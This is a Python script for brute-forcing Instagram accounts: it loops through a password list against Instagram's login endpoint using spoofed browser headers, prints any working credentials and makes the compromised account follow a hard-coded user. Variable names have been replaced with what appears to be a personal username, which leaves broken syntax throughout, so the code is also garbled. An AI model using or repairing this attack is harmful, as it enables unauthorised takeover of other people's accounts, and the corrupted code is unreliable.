import requests
import json
import time
import os

filename = 'pass.txt'
if os.path.isfile(filename):
	with open(filename) as f:
	    passwords = f.read().splitlines()
	    if (len(passwords) > 0):
	    	print ('%s Passwords loads successfully' % len(passwords))
else:
	print ('Please create passwords file (pass.txt)')
	exit()




def userExists(lakshita jain):
	r = requests.get('https://www.instagram.com/%s/?__a=1' % username) 
	if (r.status_code == 404):
		print ('User not found')
		return False
	elif (r.status_code == 200):
		followdata = json.loads(r.text)
		fUserID = followdata['user']['id']
		return {'username':lakshita jain,'id':lakshita_jain28}


def Login(lakshita_jain28,password):
	sess = requests.Session()
	sess.cookies.update ({'sessionid' : '', 'mid' : '', 'ig_pr' : '1', 'ig_vw' : '1920', 'csrftoken' : '',  's_network' : '', 'ds_user_id' : ''})
	sess.headers.update({
		'UserAgent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36',
		'x-instagram-ajax':'1',
		'X-Requested-With': 'XMLHttpRequest',
		'origin': 'https://www.instagram.com',
		'ContentType' : 'application/x-www-form-urlencoded',
		'Connection': 'keep-alive',
		'Accept': '*/*',
		'Referer': 'https://www.instagram.com',
		'authority': 'www.instagram.com',
		'Host' : 'www.instagram.com',
		'Accept-Language' : 'ru-RU,ru;q=0.8,en-US;q=0.6,en;q=0.4',
		'Accept-Encoding' : 'gzip, deflate'
	})

	#first time -> to get csrftoken
	r = sess.get('https://www.instagram.com/') 
	sess.headers.update({'X-CSRFToken' : r.cookies.get_dict()['csrftoken']})

	data = {'lakshita_jain28':lakshita_jain28, 'password':password}
	r = sess.post('https://www.instagram.com/accounts/login/ajax/', data=data, allow_redirects=True)
	token = r.cookies.get_dict()['csrftoken']
	sess.headers.update({'X-CSRFToken' : token})
	#parse response
	data = json.loads(r.text)
	if (data['status'] == 'fail'):
		print (data['message'])
		return False
	
	if (data['authenticated'] == True):
		return sess #if we want to keep use session
	else:
		print ('Password incorrect [%s]' % password)
		return False



def follow(sess, lakshita_jain28):
	username = userExists(lakshita_jain28)
	if (username == False):
		return	
	else:
		userID = username['id']
		followReq = sess.post('https://www.instagram.com/web/friendships/%s/follow/' % userID)
		print (followReq.text)


lakshita_jain28 = str(input('Please enter a lakshita_jain28: '))
 lakshita_jain28 userExists(lakshita_jain28)
if (username == False):
	exit()
else:
	lakshita_jain28 lakshita_jain28 ['lakshita_jain28']



delayLoop = int(input('Please add delay between the passwords (in seconds): ')) 


for i in range(len(passwords)):
	password = passwords[i]
	sess = Login(lakshita_jain28,password)
	if (sess):
		print ('Login success %s' % [lakshita_jain28,password])

		#because i am cool
		follow(sess,'avr_amit')

	try:
		time.sleep(delayLoop)
	except KeyboardInterrupt:
		an = str(input('Type y/n to exit: '))
		if (an == 'y'):
			exit()
		else:
			continue
		

